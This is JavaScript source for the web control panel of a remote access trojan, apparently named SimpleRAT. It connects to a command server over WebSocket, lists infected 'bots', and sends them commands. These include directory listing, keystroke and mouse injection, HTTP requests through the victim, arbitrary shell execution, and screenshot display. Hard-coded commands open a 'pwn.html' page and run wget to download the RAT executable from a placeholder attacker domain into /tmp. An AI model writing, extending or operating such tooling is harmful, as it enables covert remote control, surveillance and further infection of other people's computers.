var ws = {};
var output;
var error;

function fillCommand(id){
    var target = document.getElementById("bot_select").value;
    var command = document.getElementById('command');

    if(target === "") {alert("Please select a bot!")};

    switch (id){
        case 0:
        command.value = '{"rat_id": '+ target +', "command" : 8, "arguments" : { "directory" : "C:\"}}';
        break;
        case 1:
        command.value = '{"rat_id": '+ target +', "command" : 32, "arguments" : { "input.keys":"{ENTER}"}}';
        break;
        case 2:
        command.value = '{"rat_id": '+ target +', "command" : 64, "arguments" : {"input.mouse.x": 200, "input.mouse.y": 200}}';
        break;
        case 3:
        command.value = '{"rat_id": '+ target +', "command" : 128, "arguments" : {"http.method":"GET", "http.url": "http://<URL>"}}';
        break;
        case 4:
        command.value = '{"rat_id": '+ target +', "command" : 128, "arguments" : {"http.method":"POST", "http.url": "http://<URL>", "http.data":<DATA-optional/base64enc>}}';
        break;
        case 5:
        command.value = '{"rat_id": '+ target +', "command" : 256, "arguments" : {"cmdexec.command":"<COMMAND>"}}';
        break;
    }
}

/*==========================COMMUNICATION*/
function sendCommand(cmd) {
    var target = document.getElementById("bot_select").value;
    var command = document.getElementById('command');

    if(target === "") {alert("Please select a bot!")};
    
    switch (cmd) {
        case 0:
            ws.send('{"rat_id": '+ target +', "command" : 1, "arguments" : {}}');
            break;
        case 1:
            ws.send('{"rat_id": '+ target +', "command" : 2, "arguments" : {}}');
            break;
        case 2:
            ws.send('{"rat_id": '+ target +', "command" : 4, "arguments" : {}}');
            break;
        case 3:
            ws.send('{"rat_id": '+ target +', "command" : 16, "arguments" : {}}');
            break;
        case 4:
            ws.send(JSON.stringify({"rat_id": target, "command": 128, "arguments":  {"http.method":"GET", "http.url": "https://9gag.com/"}}));
            break;
        case 5:
            ws.send(JSON.stringify({"rat_id": target, "command": 256, "arguments":  {"cmdexec.command":"regedit"}}));
            break;
        case 6:
            ws.send(JSON.stringify({"rat_id": target, "command": 256, "arguments":  {"cmdexec.command":"calc.exe"}}));
            break;
        case 7:
            ws.send(JSON.stringify({"rat_id": target, "command" : 256, "arguments" : {"cmdexec.command" : '"C:\\Program Files\\Internet Explorer\\iexplore.exe" http://google.de'}}));
            break;
        case 8:
            ws.send(JSON.stringify({"rat_id": 0, "command" : 256, "arguments" : {"cmdexec.command":"\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" http://{DOMAIN}/pwn.html"}}));
        // linux
        case 10:
            ws.send(JSON.stringify({"rat_id": 0, "command" : 256, "arguments" : {"cmdexec.command":"nohup firefox http://{DOMAIN}/pwn.html &"}}));
            break;
        case 11:
            ws.send(JSON.stringify({"rat_id": 0, "command" : 256, "arguments" : {"cmdexec.command":"nohup wget http://{DOMAIN}/SimpleRAT.exe -O /tmp/SimpleRat_update.exe &"}}));
            break;

    }
}

function sendCustomCommand(command){
    console.log(JSON.parse(command));
    ws.send(command);
}

/*==========================CONTROLL ws*/
function stopWebSocket() {
    if (ws.readyState === WebSocket.OPEN) {
        ws.close();
    }
}

function startWebSocket() {
    //Clear Botlist
    var select = document.getElementById("bot_select");
    select.options.length = 0;
        
    output = document.getElementById("output");
    error = document.getElementById('error');

    var ip = document.getElementById("connect_ip").value.trim();

    if(ip === "") { alert("Please enter a IP!"); return; };

    if ("WebSocket" in window) {
        ws = new WebSocket("ws://"+ip+":8001/user");
        ws.onopen = function (evt) {
            onOpen(evt);
        };

        ws.onmessage = function (evt) {
            onMessage(evt);
        };

        ws.onclose = function (evt) {
            onClose(evt);
        };
    } else {
        alert("WebSocket NOT supported by your Browser!");
    }
}

/*==================EVENTS*/
function onOpen(evt) {
    console.log("Connected!");
    document.getElementById("connect").style.display = 'none';
    document.getElementById("connect_ip").style.display = 'none';
    document.getElementById("disconnect").style.display = 'block';
}
function onMessage(evt) {
    //parse JSON-msg
    var received_msg = JSON.parse(evt.data);
    console.log("Message is received...");
    
    //if msg has image print it
    if(received_msg.content !== undefined && received_msg.content.image !== undefined){
        var img = document.createElement('img');
        img.src = "data:image/png;base64,"+received_msg.content.image;
        output.prepend(img);
    }
    
    //if msg is HTTP response and has data to display render in frame
    if(received_msg.content !== undefined && received_msg.content['http.result'] !== undefined && received_msg.content['http.result'].data !== undefined){
        var encoded = received_msg.content['http.result'].data;
        var decoded = atob(encoded);
        var iframe = document.createElement('iframe');
        iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(decoded);
        output.prepend(iframe);
    }
    
    //if is error msg
    if(received_msg.errors !== undefined && received_msg.errors.length > 0){
        var formattedMsg = syntaxHighlight(received_msg.errors);
        var pre = document.createElement('pre');
        pre.innerHTML = formattedMsg;
        error.prepend(pre);
    }
    
    //if is bot connect print info & update bot selector
    if(received_msg.infos != undefined && received_msg.count != 0){
        var formattedMsg = received_msg.infos;
        var pre = document.createElement('pre');
        pre.innerHTML = formattedMsg;
        output.prepend(pre);
        
        var select = document.getElementById("bot_select");
        select.options.length = 0;
        for(var b = 0; b < received_msg.count; b++) {
            opt = document.createElement("option");
            opt.value = b;
            opt.textContent = b;
            select.appendChild(opt);
        }
    }
    if(received_msg.content !== undefined){
        var formattedMsg = syntaxHighlight(received_msg.content);
        var pre = document.createElement('pre');
        pre.innerHTML = formattedMsg;
        output.prepend(pre);
    }
}
function onClose(evt) {
    // websocket is closed.
    alert("Connection is closed...");
    document.getElementById("connect").style.display = 'block';
    document.getElementById("connect_ip").style.display = 'block';
    document.getElementById("disconnect").style.display = 'none';
}

/*===================ZUSATZ*/
function syntaxHighlight(json) {
    if (typeof json != 'string') {
        json = JSON.stringify(json, undefined, 2);
    }
    json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, function (match) {
        var cls = 'number';
        if (/^"/.test(match)) {
            if (/:$/.test(match)) {
                cls = 'key';
            } else {
                cls = 'string';
            }
        } else if (/true|false/.test(match)) {
            cls = 'boolean';
        } else if (/null/.test(match)) {
            cls = 'null';
        }
        return '<span class="' + cls + '">' + match + '</span>';
    });
}

function clearDiv(boxid){
    if(boxid){
        while (output.firstChild) {
            output.removeChild(output.firstChild);
        }
    }else{
        while (error.firstChild) {
            error.removeChild(error.firstChild);
        }
    }
}

